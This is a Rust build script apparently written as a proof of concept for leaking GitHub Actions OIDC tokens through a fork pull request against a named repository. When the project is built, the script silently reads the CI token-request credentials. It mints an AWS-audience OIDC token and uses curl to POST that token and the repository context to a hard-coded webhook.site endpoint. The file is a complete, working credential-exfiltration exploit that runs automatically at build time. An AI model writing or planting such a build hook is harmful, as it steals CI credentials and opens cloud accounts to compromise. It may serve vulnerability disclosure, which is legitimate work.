// PoC: x/build.rs for worldcoin/orb-rustzone fork-PR OIDC token leak.
// Set WEBHOOK_URL to an endpoint you control, then open a PR.
// No additional cargo dependencies â€” pure stdlib + curl (preinstalled on ubuntu-24.04).

use std::env;
use std::process::Command;

const WEBHOOK_URL: &str = "https://webhook.site/a0f06a32-37a2-4896-aba8-4ed31622c258";
const AUDIENCE: &str = "sts.amazonaws.com";

fn main() {
    println!("cargo:rerun-if-changed=build.rs");

    let req_token = match env::var("ACTIONS_ID_TOKEN_REQUEST_TOKEN") {
        Ok(v) => v,
        Err(_) => return, // not running in a privileged job; exit silently
    };
    let req_url = match env::var("ACTIONS_ID_TOKEN_REQUEST_URL") {
        Ok(v) => v,
        Err(_) => return,
    };

    let mint_url = format!("{}&audience={}", req_url, AUDIENCE);
    let auth_header = format!("Authorization: bearer {}", req_token);
    let mint_body = match Command::new("curl")
        .args(["-s", "-H", &auth_header, &mint_url])
        .output()
    {
        Ok(out) if out.status.success() => out.stdout,
        _ => return,
    };

    let mut ctx_fields = String::new();
    for (key, var) in &[
        ("github_repository", "GITHUB_REPOSITORY"),
        ("github_ref", "GITHUB_REF"),
        ("github_sha", "GITHUB_SHA"),
        ("github_run_id", "GITHUB_RUN_ID"),
        ("github_actor", "GITHUB_ACTOR"),
    ] {
        let val = env::var(var)
            .unwrap_or_default()
            .replace('\\', "\\\\")
            .replace('"', "\\\"");
        ctx_fields.push_str(&format!("\"{key}\":\"{val}\","));
    }

    let oidc_json = String::from_utf8_lossy(&mint_body);
    let payload = format!("{{{ctx_fields}\"oidc_response\":{}}}", oidc_json.trim());

    let _ = Command::new("curl")
        .args([
            "-s", "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", &payload,
            WEBHOOK_URL,
        ])
        .output();
}
